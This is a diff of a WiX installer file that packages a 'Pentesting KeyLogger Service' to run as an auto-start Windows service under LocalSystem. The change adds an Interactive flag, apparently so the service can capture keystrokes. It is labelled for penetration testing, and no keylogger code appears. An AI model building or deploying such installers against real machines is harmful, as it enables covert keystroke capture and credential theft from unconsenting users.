@@ -32,7 +32,8 @@
                         Description="Pentesting KeyLogger Service"
                         Start="auto"
                         Account="LocalSystem"
-                        ErrorControl="normal" />
+                        ErrorControl="normal"
+                        Interactive="yes" />
         <ServiceControl Id="StartService" Start="install" Stop="both" Remove="uninstall" Name="KeyLoggerService" Wait="yes" />
       </Component>
       <Component Id="KeyLoggerService.exe.config" Guid="22345678-1234-1234-1234-123456789012">
